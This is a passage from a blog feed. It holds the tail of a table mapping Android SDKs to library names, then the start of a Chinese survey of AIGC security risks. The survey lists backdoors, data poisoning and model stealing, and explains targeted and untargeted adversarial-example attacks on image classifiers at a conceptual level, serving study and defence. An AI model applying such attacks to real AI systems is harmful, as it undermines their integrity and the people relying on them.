SDK</td><td>libaliresample.so</td></tr><tr><td>同盾设备指纹</td><td>libtongdun.so</td></tr><tr><td>Faceunity Nama SDK</td><td>libCNamaSDK.so</td></tr><tr><td>Faceunity Nama SDK</td><td>libfuai.so</td></tr><tr><td>离线语音合成 SDK</td><td>libbd_etts.so</td></tr><tr><td>离线语音合成 SDK</td><td>libBDSpeechDecoder_V1.so</td></tr><tr><td>MSA SDK</td><td>libnllvm(.*).so</td></tr><tr><td>爱加密</td><td>libexec.so</td></tr><tr><td>爱加密</td><td>libexecmain.so</td></tr><tr><td>爱加密</td><td>libexecmain_x86.so</td></tr><tr><td>爱加密</td><td>libexecoat.so</td></tr><tr><td>爱加密</td><td>libexecoat_x86.so</td></tr><tr><td>语音识别 SDK</td><td>libBaiduSpeechSDK.so</td></tr><tr><td>语音识别 SDK</td><td>libbd_easr_s1_merge_normal_20151216.dat.so</td></tr><tr><td>语音识别 SDK</td><td>libbdEASRAndroid.so</td></tr><tr><td>语音识别 SDK</td><td>libbdSpilWakeup.so</td></tr><tr><td>语音识别 SDK</td><td>libvad.dnn.so</td></tr><tr><td>Frame Pacing</td><td>libswappy.so</td></tr><tr><td>Frame Pacing</td><td>libswappyVk.so</td></tr><tr><td>U-Game 金融风控组件</td><td>libsecurityenv.so</td></tr><tr><td>libhfyuv</td><td>libhfyuv.so</td></tr><tr><td>QuickJS Binding</td><td>libquickjs-android.so</td></tr><tr><td>网易易盾</td><td>libnetsecsdk-(.*).so</td></tr><tr><td>网易易盾</td><td>libnetmobsec-(.*).so</td></tr><tr><td>bspatch</td><td>libbspatch.so</td></tr><tr><td>Tesseract</td><td>libtess.so</td></tr><tr><td>Paddle Lite</td><td>libPaddle.so</td></tr><tr><td>Paddle Lite</td><td>libpaddle_light_api_shared.so</td></tr><tr><td>Paddle Lite</td><td>libpaddle_mobile_jni.so</td></tr><tr><td>Paddle Lite</td><td>libpaddle-mobile.so</td></tr><tr><td>Paddle Lite</td><td>libpaddle_full_api_shared.so</td></tr><tr><td>Paddle Lite</td><td>liblite_pybind.so</td></tr><tr><td>Speex</td><td>libspeex.so</td></tr><tr><td>Speex</td><td>libspeexdsp.so</td></tr><tr><td>AGC APM</td><td>libapms_ndk_anr.so</td></tr><tr><td>mPaaS</td><td>libandroid-phone-(.*).so</td></tr><tr><td>mPaaS</td><td>libcom-mpaas-(.*).so</td></tr><tr><td>阿里云语音服务 SDK</td><td>libztcodec2.so</td></tr><tr><td>阿里移动热修复</td><td>libsophix.so</td></tr><tr><td>Kraken</td><td>libkraken.so</td></tr><tr><td>手游安全 SDK</td><td>libtersafe.so</td></tr><tr><td>手游安全 SDK</td><td>libtersafe2.so</td></tr><tr><td>日志服务 SLS</td><td>libsls_producer.so</td></tr><tr><td>AIUI</td><td>libaiui.so</td></tr><tr><td>旷视 SDK</td><td>libmegface.so</td></tr><tr><td>人像美化 SDK</td><td>libMGBeauty.so</td></tr><tr><td>人像美化 SDK</td><td>libMegviiDlmk.so</td></tr><tr><td>正版曲库直通车</td><td>libtxcopyrightedmedia.so</td></tr><tr><td>libavif</td><td>libavif.so</td></tr><tr><td>libavif</td><td>libavif-jni.so</td></tr><tr><td>python-for-android</td><td>libpymodules.so</td></tr><tr><td>(0.\d*[1-9]))(m)?.so</td><td>(libpython([1-9]\d*.?\d*)</td></tr><tr><td>SDL</td><td>libsdl.so</td></tr><tr><td>SDL</td><td>libsdl_(.*).so</td></tr><tr><td>AVPro Video</td><td>libaudio360.so</td></tr><tr><td>AVPro Video</td><td>libaudio360-JNI.so</td></tr><tr><td>MSDK</td><td>libMSDK.so</td></tr><tr><td>MSDK</td><td>libMsdkAdapter.so</td></tr><tr><td>MSDK</td><td>libMSDKSystem.so</td></tr><tr><td>游戏语音 GVoice</td><td>libGCloudVoice.so</td></tr><tr><td>Matrix</td><td>libio-canary.so</td></tr><tr><td>Matrix</td><td>libmatrix_hprof_analyzer.so</td></tr><tr><td>Matrix</td><td>libmatrix_mem_util.so</td></tr><tr><td>CZXing</td><td>libczxing.so</td></tr><tr><td>Jetpack ShareTarget</td><td>androidx.sharetarget.ChooserTargetServiceCompat</td></tr><tr><td>APMInsight</td><td>libapminsighta.so</td></tr><tr><td>APMInsight</td><td>libapminsightb.so</td></tr><tr><td>PlayerSDK</td><td>libjeffmony.so</td></tr><tr><td>AliNNPython</td><td>libAliNNPython.so</td></tr><tr><td>JusTalk Cloud</td><td>libmtc.so</td></tr><tr><td>JusTalk Cloud</td><td>libzmf.so</td></tr><tr><td>Qimei SDK</td><td>libqmp.so</td></tr><tr><td>FFmpeg</td><td>libffmpegkit.so</td></tr><tr><td>文字识别服务</td><td>libdict-parser.so</td></tr><tr><td>Un7zip</td><td>libun7zip.so</td></tr><tr><td>GaiaX</td><td>libGXAnalyzeAndroid.so</td></tr><tr><td>GaiaX</td><td>libGXAnalyzeCore.so</td></tr><tr><td>TanX</td><td>libalitanx-lib.so</td></tr><tr><td>opencore-amr</td><td>libfdk-aac.so</td></tr><tr><td>AnyChat</td><td>libmediautil_v6.so</td></tr><tr><td>AnyChat</td><td>libmediautil_v7.so</td></tr><tr><td>AnyChat</td><td>libmediautil_v8.so</td></tr><tr><td>AnyChat</td><td>libanychatcore.so</td></tr><tr><td>AnyChat</td><td>libaudio_preprocessing.so</td></tr><tr><td>AnyChat</td><td>libmediacore.so</td></tr><tr><td>AnyChat</td><td>libmediashow.so</td></tr><tr><td>HONOR Push</td><td>com.hihonor.push.sdk.PushReceiver</td></tr><tr><td>HONOR Push</td><td>com.hihonor.push.sdk.init.AutoInitProvider</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.tg.WebAdActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.tg.PortraitADActivity</td></tr><tr><td>Bugly</td><td>libBugly-idasc.so</td></tr><tr><td>Bugly</td><td>libBugly_Native.so</td></tr><tr><td>阿里聚安全</td><td>libsgmiddletierso(.*).so</td></tr><tr><td>阿里聚安全</td><td>libsgmiscso(.*).so</td></tr><tr><td>百度应用加固</td><td>libbaiduprotect.so</td></tr><tr><td>百度应用加固</td><td>libbaiduprotect_x86.so</td></tr><tr><td>百度应用加固</td><td>libbaiduprotect_art.so</td></tr><tr><td>mPaaS</td><td>libmpaas_crypto.so</td></tr><tr><td>mPaaS</td><td>libmpaascpu.so</td></tr><tr><td>百度人脸识别</td><td>libbdface_sdk.so</td></tr><tr><td>百度人脸识别</td><td>libbd_license.so</td></tr><tr><td>百度人脸识别</td><td>libbd_unifylicense.so</td></tr><tr><td>百度人脸识别</td><td>libliantian.so</td></tr><tr><td>百度人脸识别</td><td>libaikl_cluster_arm.so</td></tr><tr><td>百度人脸识别</td><td>libaikl_calc_arm.so</td></tr><tr><td>屹通 SDK</td><td>libyt_safe.so</td></tr><tr><td>屹通 SDK</td><td>libYTKeyboard.so</td></tr><tr><td>PJSIP</td><td>libpjsua2.so</td></tr><tr><td>HUAWEI Push(TPNS Proxy)</td><td>com.tencent.android.hwpush.HWPushMessageReceiver</td></tr><tr><td>友盟推送</td><td>com.umeng.message.component.UmengNotificationReceiver</td></tr><tr><td>AntiFakerAndroidChecker</td><td>libemulator_check.so</td></tr><tr><td>AntiFakerAndroidChecker</td><td>libproperty_get.so</td></tr><tr><td>EasyAR</td><td>libEasyAR.so</td></tr><tr><td>EasyAR</td><td>libEasyARPlayer.so</td></tr><tr><td>Hippy</td><td>libhippy.so</td></tr><tr><td>eID SDK</td><td>libeidjni.so</td></tr><tr><td>金山云短视频编辑 SDK</td><td>libksylive.so</td></tr><tr><td>金山云短视频编辑 SDK</td><td>libksyapm.so</td></tr><tr><td>数字联盟可信 ID SDK</td><td>libdu.so</td></tr><tr><td>腾讯灯塔 SDK</td><td>libbeaconid.so</td></tr><tr><td>人脸核身 SDK</td><td>libYTCommon.so</td></tr><tr><td>人脸核身 SDK</td><td>libYTCommonLiveness.so</td></tr><tr><td>人脸核身 SDK</td><td>libYTLiveness.so</td></tr><tr><td>腾讯云实时音视频 SDK</td><td>libtxsoundtouch.so</td></tr><tr><td>个推</td><td>com.igexin.sdk.GService</td></tr><tr><td>Android Beacon Library</td><td>org.altbeacon.beacon.service.ScanJob</td></tr><tr><td>Android Beacon Library</td><td>org.altbeacon.beacon.BeaconIntentProcessor</td></tr><tr><td>Android Beacon Library</td><td>org.altbeacon.bluetooth.BluetoothTestJob</td></tr><tr><td>Android Beacon Library</td><td>org.altbeacon.beacon.service.BeaconService</td></tr><tr><td>Android Beacon Library</td><td>org.altbeacon.beacon.startup.StartupBroadcastReceiver</td></tr><tr><td>Mira</td><td>com.bytedance.mira.MiraPluginListActivity</td></tr><tr><td>Mira</td><td>com.bytedance.mira.MiraErrorBackupActivity</td></tr><tr><td>Mira</td><td>com.bytedance.mira.stub.RedirectActivity</td></tr><tr><td>Mira</td><td>com.bytedance.mira.stub.PluginLoaderActivity</td></tr><tr><td>Mira</td><td>com.bytedance.mira.stub.p[0-9]*.StubTranslucentActivity</td></tr><tr><td>Mira</td><td>com.bytedance.mira.stub.p[0-9]<em>.StubStandardActivity[0-9]</em>$</td></tr><tr><td>Mira</td><td>com.bytedance.mira.stub.p[0-9]<em>.StubSingleTopActivity[0-9]</em>$</td></tr><tr><td>Mira</td><td>com.bytedance.mira.stub.p[0-9]<em>.StubSingleTaskActivity[0-9]</em>$</td></tr><tr><td>Mira</td><td>com.bytedance.mira.stub.p[0-9]<em>.StubSingleInstanceActivity[0-9]</em>$</td></tr><tr><td>Mira</td><td>com.bytedance.mira.stub.RedirectService</td></tr><tr><td>Mira</td><td>com.bytedance.mira.am.KeepAlive</td></tr><tr><td>Mira</td><td>com.bytedance.mira.am.KeepAlive$InnerService</td></tr><tr><td>Mira</td><td>com.bytedance.mira.stub.p[0-9]<em>.StubService[0-9]</em>$</td></tr><tr><td>Mira</td><td>com.bytedance.mira.pm.PluginPackageManagerProvider</td></tr><tr><td>Mira</td><td>com.bytedance.mira.am.PluginActivityManagerProvider</td></tr><tr><td>Mira</td><td>com.bytedance.mira.stub.p0.StubContentProvider</td></tr><tr><td>Mira</td><td>com.bytedance.mira.stub.p1.StubContentProvider</td></tr><tr><td>金融级实人认证 SDK</td><td>libtoyger.so</td></tr><tr><td>Pdfium</td><td>libmodpng.so</td></tr><tr><td>Sonic</td><td>libsonic.so</td></tr><tr><td>智齿客服 SDK</td><td>libsobot.so</td></tr><tr><td>React Native</td><td>libfabricjni.so</td></tr><tr><td>React Native</td><td>libjsi.so</td></tr><tr><td>React Native</td><td>libjsijniprofiler.so</td></tr><tr><td>React Native</td><td>liblogger.so</td></tr><tr><td>React Native</td><td>libmapbufferjni.so</td></tr><tr><td>React Native</td><td>libreact_codegen_rncore.so</td></tr><tr><td>React Native</td><td>libreact_codegen_reactandroidspec</td></tr><tr><td>React Native</td><td>libreact_config.so</td></tr><tr><td>React Native</td><td>libreact_debug.so</td></tr><tr><td>React Native</td><td>libreact_nativemodule_core.so</td></tr><tr><td>React Native</td><td>libreact_render_(.*).so</td></tr><tr><td>React Native</td><td>libreact_utils.so</td></tr><tr><td>React Native</td><td>libreactconfig.so</td></tr><tr><td>React Native App Utils</td><td>libreactnativeutilsjni.so</td></tr><tr><td>React Native</td><td>libreactperfloggerjni.so</td></tr><tr><td>React Native</td><td>libturbomodulejsijni.so</td></tr><tr><td>React Native</td><td>librrc_(.*).so</td></tr><tr><td>旷视 SDK</td><td>libMegviiIDCardQuality(.*).so</td></tr><tr><td>旷视 SDK</td><td>liblivenessdetection(.*).so</td></tr><tr><td>旷视 SDK</td><td>libbankcard(.*).so</td></tr><tr><td>Matrix</td><td>libtrace-canary.so</td></tr><tr><td>Hyperscan</td><td>libhs.so</td></tr><tr><td>阿里云号码认证 SDK</td><td>libalicomphonenumberauthsdk_core.so</td></tr><tr><td>KOOM</td><td>libkwai-android-base.so</td></tr><tr><td>个推</td><td>com.igexin.download.DownloadService</td></tr><tr><td>TensorFlow Lite</td><td>libtensorflowlite_flex_jni.so</td></tr><tr><td>TensorFlow Lite</td><td>libtensorflowLite.so</td></tr><tr><td>Brotli</td><td>libbrotli.so</td></tr><tr><td>React Native Reanimated</td><td>libreanimated.so</td></tr><tr><td>ZAndrolua</td><td>liblposix.so</td></tr><tr><td>realm</td><td>librealmc.so</td></tr><tr><td>ZXing</td><td>libzxing.so</td></tr><tr><td>极光认证 SDK</td><td>libgtcore.so</td></tr><tr><td>美洽客服 SDK</td><td>com.meiqia.core.MeiQiaService</td></tr><tr><td>LibAVIF</td><td>libavif_android.so</td></tr><tr><td>人脸核身 SDK</td><td>libYTPoseDetect.so</td></tr><tr><td>人脸核身 SDK</td><td>libYTAGReflectLiveCheck.so</td></tr><tr><td>人脸核身 SDK</td><td>libYTFaceAlignment.so</td></tr><tr><td>人脸核身 SDK</td><td>libYTLipReader.so</td></tr><tr><td>人脸核身 SDK</td><td>libYTFaceReflect.so</td></tr><tr><td>人脸核身 SDK</td><td>libYTFaceTracker.so</td></tr><tr><td>人脸核身 SDK</td><td>libYTFaceDetector.so</td></tr><tr><td>人脸核身 SDK</td><td>libYTFaceTrackPro2.so</td></tr><tr><td>一键登录 SDK</td><td>com.mobile.auth.gatewayauth.LoginAuthActivity</td></tr><tr><td>一键登录 SDK</td><td>com.mobile.auth.gatewayauth.PrivacyDialogActivity</td></tr><tr><td>一键登录 SDK</td><td>com.mobile.auth.gatewayauth.activity.AuthWebVeiwActivity</td></tr><tr><td>人脸核身 SDK</td><td>com.tencent.cloud.huiyansdkface.facelight.ui.FaceGuideActivity</td></tr><tr><td>人脸核身 SDK</td><td>com.tencent.cloud.huiyansdkface.facelight.ui.FaceProtocalActivity</td></tr><tr><td>人脸核身 SDK</td><td>com.tencent.cloud.huiyansdkface.facelight.ui.FaceVerifyActivity</td></tr><tr><td>Google AdMob</td><td>com.google.android.gms.ads.OutOfContextTestingActivity</td></tr><tr><td>KOOM</td><td>com.kwai.koom.javaoom.monitor.analysis.HeapAnalysisService</td></tr><tr><td>HONOR Push(TPNS Proxy)</td><td>com.tencent.android.tpush.honor.HonorMessageService</td></tr><tr><td>阿里聚安全</td><td>libsgmainso.version.so</td></tr><tr><td>阿里聚安全</td><td>libsgsecuritybodyso.version.so</td></tr><tr><td>百度人脸识别</td><td>com.baidu.liantian.LiantianActivity</td></tr><tr><td>个推</td><td>com.igexin.sdk.GetuiActivity</td></tr><tr><td>个推</td><td>com.igexin.sdk.MActivity</td></tr><tr><td>Instabug</td><td>com.instabug.bug.view.reporting.ReportingContainerActivity</td></tr><tr><td>Instabug</td><td>com.instabug.chat.ui.ChatActivity</td></tr><tr><td>Instabug</td><td>com.instabug.featuresrequest.ui.FeaturesRequestActivity</td></tr><tr><td>Instabug</td><td>com.instabug.library.internal.video.RequestPermissionActivity</td></tr><tr><td>Instabug</td><td>com.instabug.library.invocation.invocationdialog.InstabugDialogActivity</td></tr><tr><td>Instabug</td><td>com.instabug.library.ui.onboarding.OnboardingActivity</td></tr><tr><td>Instabug</td><td>com.instabug.survey.announcements.ui.activity.AnnouncementActivity</td></tr><tr><td>Instabug</td><td>com.instabug.survey.ui.SurveyActivity</td></tr><tr><td>融云 IM SDK</td><td>io.rong.push.notification.RongBridgeActivity</td></tr><tr><td>Wwise</td><td>libAkSoundEngine.so</td></tr><tr><td>Bugly</td><td>libBugly-yaq.so</td></tr><tr><td>游戏语音 GVoice</td><td>libGVoice.so</td></tr><tr><td>HiAI Foundation</td><td>libai_fmk_dnnacl.so</td></tr><tr><td>百度应用加固</td><td>libbaiduprotect_sec_jni.so</td></tr><tr><td>HiAI Foundation</td><td>libcpucl.so</td></tr><tr><td>HiAI Foundation</td><td>libhiai.so</td></tr><tr><td>HiAI Foundation</td><td>libhiai_c_def.so</td></tr><tr><td>HiAI Foundation</td><td>libhiai_debugger.so</td></tr><tr><td>HiAI Foundation</td><td>libhiai_hcl_model_runtime.so</td></tr><tr><td>HiAI Foundation</td><td>libhiai_ir.so</td></tr><tr><td>HiAI Foundation</td><td>libhiai_ir_build.so</td></tr><tr><td>HiAI Foundation</td><td>libhiai_ir_build_aipp.so</td></tr><tr><td>HiAI Foundation</td><td>libhiai_ir_infershape.so</td></tr><tr><td>HiAI Foundation</td><td>libhiai_model_compatible.so</td></tr><tr><td>环信 IM</td><td>libhyphenate_av.so</td></tr><tr><td>Instabug</td><td>libibg-native.so</td></tr><tr><td>爱加密</td><td>libijm-emulator.so</td></tr><tr><td>爱加密</td><td>libijmDataEncryption.so</td></tr><tr><td>爱加密</td><td>libijmDataEncryption_arm64.so</td></tr><tr><td>爱加密</td><td>libijmDataEncryption_x86.so</td></tr><tr><td>爱加密</td><td>libijmDataEncryption_x86_64.so</td></tr><tr><td>360 加固</td><td>libjiagu_vip.so</td></tr><tr><td>360 加固</td><td>libjiagu_vip_x64.so</td></tr><tr><td>HiAI Foundation</td><td>libmodelcrypto.so</td></tr><tr><td>网易易盾</td><td>libnesec_x86.so</td></tr><tr><td>Mozilla NSS</td><td>libnss3.so</td></tr><tr><td>Rust</td><td>librust.so</td></tr><tr><td>Tun2Socks</td><td>libtun2socks.so</td></tr><tr><td>百度人脸识别</td><td>com.baidu.liantian.LiantianProvider</td></tr><tr><td>Instabug</td><td>com.instabug.apm.contentprovider.APMContentProvider</td></tr><tr><td>Instabug</td><td>com.instabug.crash.CrashContentProvider</td></tr><tr><td>Instabug</td><td>com.instabug.library.internal.contentprovider.InstabugContentProvider</td></tr><tr><td>融云 IM SDK</td><td>io.rong.imlib.chatroom.base.ChatRoomContentProvider</td></tr><tr><td>融云 IM SDK</td><td>io.rong.imlib.cs.base.CustomServiceContentProvider</td></tr><tr><td>融云 IM SDK</td><td>io.rong.imlib.discussion.base.DiscussionContentProvider</td></tr><tr><td>融云 IM SDK</td><td>io.rong.imlib.location.base.LocationContentProvider</td></tr><tr><td>融云 IM SDK</td><td>io.rong.imlib.publicservice.base.PublicServiceContentProvider</td></tr><tr><td>百度人脸识别</td><td>com.baidu.liantian.LiantianReceiver</td></tr><tr><td>DataFinder</td><td>com.bytedance.mapplog.collector.Collector</td></tr><tr><td>融云 IM SDK</td><td>io.rong.imlib.ConnectChangeReceiver</td></tr><tr><td>融云 IM SDK</td><td>io.rong.imlib.HeartbeatReceiver</td></tr><tr><td>融云 IM SDK</td><td>io.rong.push.rongpush.PushReceiver</td></tr><tr><td>百度人脸识别</td><td>com.baidu.liantian.LiantianService</td></tr><tr><td>个推</td><td>com.igexin.assist.control.stp.StpService</td></tr><tr><td>个推</td><td>com.igexin.sdk.GTIntentService</td></tr><tr><td>个推</td><td>com.igexin.sdk.HonorPushMessageService</td></tr><tr><td>Instabug</td><td>com.instabug.library.internal.video.ScreenRecordingService</td></tr><tr><td>Instabug</td><td>com.instabug.library.screenshot.ScreenshotCaptureService</td></tr><tr><td>Instabug</td><td>com.instabug.terminations.TerminationsDetectorService</td></tr><tr><td>融云 IM SDK</td><td>io.rong.imlib.ipc.RongService</td></tr><tr><td>融云 IM SDK</td><td>io.rong.push.rongpush.PushService</td></tr><tr><td>GMP Push SDK</td><td>com.bytedance.push.notification.PassThoughActivity</td></tr><tr><td>GMP Push SDK</td><td>com.bytedance.push.notification.PushActivity</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.message.sswo.SswoActivity</td></tr><tr><td>友盟推送</td><td>com.umeng.message.component.UmengNotificationClickActivity</td></tr><tr><td>Breakpad</td><td>libbreakpad_client.so</td></tr><tr><td>Gio</td><td>libgio.so</td></tr><tr><td>Isar Database</td><td>libisar.so</td></tr><tr><td>MindSpore Lite</td><td>libmindspore-lite.so</td></tr><tr><td>LibMpv</td><td>libmpv.so</td></tr><tr><td>NativeAudio</td><td>libnativeaudioe7.so</td></tr><tr><td>Paddle Lite</td><td>libpaddle_lite_jni.so</td></tr><tr><td>React Native Skia</td><td>librnskia.so</td></tr><tr><td>ShadowHook</td><td>libshadowhook.so</td></tr><tr><td>TagLib</td><td>libtag.so</td></tr><tr><td>Pangle SDK</td><td>libzeus_direct_dex.so</td></tr><tr><td>GMP Push SDK</td><td>com.bytedance.push.settings.storage.PushProvider</td></tr><tr><td>Pangle SDK</td><td>com.bytedance.sdk.openadsdk.TTFileProvider</td></tr><tr><td>Pangle SDK</td><td>com.bytedance.sdk.openadsdk.multipro.TTMultiProvider</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.push.PushFileProvider</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.pushmanager.setting.PushMultiProcessSharedProvider</td></tr><tr><td>友盟推送</td><td>com.umeng.message.component.UmengMessageProvider</td></tr><tr><td>Jetpack Tracing</td><td>androidx.tracing.perfetto.TracingReceiver</td></tr><tr><td>Facebook SDK</td><td>com.facebook.AuthenticationTokenManager$CurrentAuthenticationTokenChangedBroadcastReceiver</td></tr><tr><td>Meizu Push(GMP Proxy)</td><td>com.meizu.message.MzMessageReceiver</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.message.MessageReceiver</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.message.sswo.SswoReceiver</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.push.DefaultReceiver</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.push.daemon.PushReceiver</td></tr><tr><td>vivo Push(GMP Proxy)</td><td>com.vivo.VivoPushMessageReceiver</td></tr><tr><td>MiPush(GMP Proxy)</td><td>com.xiaomi.push.service.receivers.MIPushMessageHandler</td></tr><tr><td>阿里移动推送(GMP Proxy)</td><td>com.alibaba.sdk.android.push.CloudPushIntentService</td></tr><tr><td>阿里移动推送(GMP Proxy)</td><td>com.alibaba.sdk.android.push.PushIntentService</td></tr><tr><td>GMP Push SDK</td><td>com.bytedance.push.alive.ForegroundService</td></tr><tr><td>HUAWEI Push(GMP Proxy)</td><td>com.huawei.MessageService</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.message.NotifyIntentService</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.message.NotifyService</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.message.PushJobService</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.message.log.LogService</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.newmedia.redbadge.RedBadgePushProcessService</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.newmedia.redbadge.RedbadgeHandler</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.push.DefaultService</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.push.daemon.PushProcessService</td></tr><tr><td>GMP Push SDK</td><td>com.ss.android.push.daemon.PushService</td></tr><tr><td>友盟推送(GMP Proxy)</td><td>com.umeng.UmengMessageHandler</td></tr><tr><td>友盟推送</td><td>com.umeng.message.component.UmengIntentService</td></tr><tr><td>友盟推送</td><td>com.umeng.message.component.UmengMessageHandlerService</td></tr><tr><td>友盟推送</td><td>com.umeng.message.component.UmengMessageReceiverService</td></tr><tr><td>阿里云号码认证 SDK</td><td>libauth_number_product-(.*).so</td></tr></tbody></table>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AIGC安全调研</title>
    <link href="/2025/01/06/AIGC%E5%AE%89%E5%85%A8%E8%B0%83%E7%A0%94/"/>
    <url>/2025/01/06/AIGC%E5%AE%89%E5%85%A8%E8%B0%83%E7%A0%94/</url>
    
    <content type="html"><![CDATA[<h1 id="AIGC安全调研"><a href="#AIGC安全调研" class="headerlink" title="AIGC安全调研"></a><strong>AIGC安全调研</strong></h1><h2 id="一、-AIGC全生命周期风险"><a href="#一、-AIGC全生命周期风险" class="headerlink" title="一、 AIGC全生命周期风险"></a>一、 <strong>AIGC全生命周期风险</strong></h2><h3 id="1-初始阶段"><a href="#1-初始阶段" class="headerlink" title="1. 初始阶段"></a>1. <strong>初始阶段</strong></h3><p>初始阶段安全风险。初始阶段是指将想法转化为有形系统的过程，主要包括任务分析、需求定义、风险管理等过程。这个阶段的安全风险主要表现为对人工智能应用目标的设定有悖国家法律法规和社会伦理规范</p><p><strong>风险<strong><strong>一</strong></strong>：****应用目标有悖国家法律法规和社会伦理规范</strong></p><h3 id="2-设计研发阶段"><a href="#2-设计研发阶段" class="headerlink" title="2. 设计研发阶段"></a>2. <strong>设计研发阶段</strong></h3><p>设计研发阶段安全风险。设计研发阶段是指完成可部署人工智能系统创建的过程，主要句括确定设计方法、定义系统框架、软件代码实现、风险管理等过程。这个阶段的安全风险主要表现为人工智能基础设施不完善、技术脆弱性以及设计研发有误等引发的安全风险。</p><p><strong>风险一：AI基础设施不完善</strong></p><p>风险表现：</p><ol><li>算法后门嵌入</li><li>代码安全漏洞，训练数据不均衡</li><li>训练数据投毒，训练数据泄漏</li></ol><p><strong>风险二：AI技术脆弱性</strong></p><p>风险表现：</p><ol><li>算法弱鲁棒性</li><li>算法不可解释</li><li>算法偏见歧视</li></ol><p><strong>风险三：AI设计研发有误</strong></p><p>风险表现：系统不可控行为</p><h3 id="3-校验验证阶段"><a href="#3-校验验证阶段" class="headerlink" title="3. 校验验证阶段"></a>3. <strong>校验验证阶段</strong></h3><p>检验验证阶段安全风险。检验验证阶段是指检查人工智能系统是否按照预期需求工作以及是否完全满足预定目标。这个阶段的安全风险主要表现为测试验证不充分，未及时发现和修复前序阶段的安全风险</p><p><strong>风险一：测试验证不充分</strong></p><p>风险表现：未及时发现和修复前序阶段安全风险</p><h3 id="4-部署阶段"><a href="#4-部署阶段" class="headerlink" title="4. 部署阶段"></a>4. <strong>部署阶段</strong></h3><p>部署阶段安全风险。部署阶段是指在目标环境中安装和配置人工智能系统的过程。这个阶段的安全风险主要表现为人工智能系统部署的软硬件环境不可信，系统可能遭受非授权访问和非授权使用。</p><p><strong>风险一：部署环境不可信</strong></p><p>风险表现：非授权访问、非授权使用</p><h3 id="5-运行监控阶段"><a href="#5-运行监控阶段" class="headerlink" title="5. 运行监控阶段"></a>5. <strong>运行监控阶段</strong></h3><p>运行监控阶段安全风险。运行监控阶段，人工智能系统处于运行和可使用状态，主要包括运行监控、维护升级等过程。这个阶段的安全风险主要表现为恶意攻击者对人工智能系统发起的对抗样本、算法后门、模型窃取、模型反馈误导、数据逆向还原、成员推理、属性推断、代码漏洞利用等安全攻击，以及人工智能系统遭受滥用或恶意应用。</p><p><strong>风险一：新型安全攻击</strong></p><p>风险表现：</p><ol><li>对抗样本攻击、算法后门攻击</li><li>模型窃取攻击、模型反馈误导</li><li>数据逆向还原、成员推理攻击</li><li>属性推断攻击、代码漏洞利用</li></ol><p><strong>风险二：不安全的使用</strong></p><p>风险表现：滥用&#x2F;恶意应用</p><h3 id="6-持续验证阶段"><a href="#6-持续验证阶段" class="headerlink" title="6. 持续验证阶段"></a>6. <strong>持续验证阶段</strong></h3><p>持续验证阶段安全风险。在持续验证阶段，对于开展持续学习的人工智能系统进行持续检验和验证。这个阶段的安全风险主要表现为测试验证数据更新不及时，未及时发现和修复因持续学习引入的模型反馈误导等安全风险</p><p><strong>风险一：测试验证数据更新不及时</strong></p><p>风险表现：未及时发现和修复因持续学习引入的模型反馈误导等安全风险</p><h3 id="7-重新评估阶段"><a href="#7-重新评估阶段" class="headerlink" title="7. 重新评估阶段"></a>7. <strong>重新评估阶段</strong></h3><p>重新评估阶段安全风险。当初始目标无法达到或者需要修改时，进入重新评估阶段。该阶段主要句括设计定义、需求定义、风险管理等过程。这个阶段主要涉及需求调整和重新定义，因而其安全风险与初始阶段的安全风险类似，即人工智能应用目标的设定有悖国家法律法规和社会伦理规范。</p><p><strong>风险一：应用目标有悖国家法律法规和社会伦理规范</strong></p><h3 id="8-废弃阶段"><a href="#8-废弃阶段" class="headerlink" title="8. 废弃阶段"></a>8. <strong>废弃阶段</strong></h3><p>废弃阶段安全风险。在废弃阶段，废弃销毁使用目的不复存在或者有更好解决方法替换的人工智能系统，主要包括数据、算法模型以及系统整体的废弃销毁过程。这个阶段的安全风险主要表现为销毁不彻底，泄露个人隐私。</p><p><strong>风险一：销毁不彻底</strong></p><p>表现形式：泄露个人隐私</p><h2 id="二、AIGC面临的风险与防御方式汇总"><a href="#二、AIGC面临的风险与防御方式汇总" class="headerlink" title="二、AIGC面临的风险与防御方式汇总"></a><strong>二、AIGC面临的风险与防御方式汇总</strong></h2><h3 id="1-对抗样本攻击风险"><a href="#1-对抗样本攻击风险" class="headerlink" title="1. 对抗样本攻击风险"></a>1. <strong>对抗样本攻击风险</strong></h3><h4 id="1-1-对抗样本的基本原理"><a href="#1-1-对抗样本的基本原理" class="headerlink" title="1.1 对抗样本的基本原理"></a><strong>1.1 对抗样本的基本原理</strong></h4><p>对抗样本攻击主要通过在干净样本中<strong>添加人们难以察觉的细微扰动</strong>，来时正常训练的深度学习模型<strong>输出置信度很高的错误判断</strong>。对抗样本攻击的核心在于如何构造细微扰动。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641686.png" alt="img"></p><h4 id="1-2-对抗样本攻击类别"><a href="#1-2-对抗样本攻击类别" class="headerlink" title="1.2 对抗样本攻击类别"></a><strong>1.2 对抗样本攻击类别</strong></h4><p>目前的对抗样本从是否需要指定攻击的类目可以分为:</p><p><strong>非定向攻击</strong>(non-targeted attack)和<strong>定向****攻击</strong>(targeted attack)</p><ol><li>定向攻击旨在讲深度学习模型误导至攻击者指定的输出，如在分类人物中指定将熊猫识别为牛，如下图</li></ol><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641732.png" alt="img"></p><p>定向攻击机要降低深度学习模型对输入样本真实标签的置信度，又要尽可能的提升攻击者指定标签的置信度，因此攻击难度较大。</p><ol start="2"><li>非定向攻击旨在将深度学习木星误导至错误的类别，而不指定具体的类别，如在分类人物中将熊猫识别为非熊猫的任一类别，如下图：</li></ol><p><img 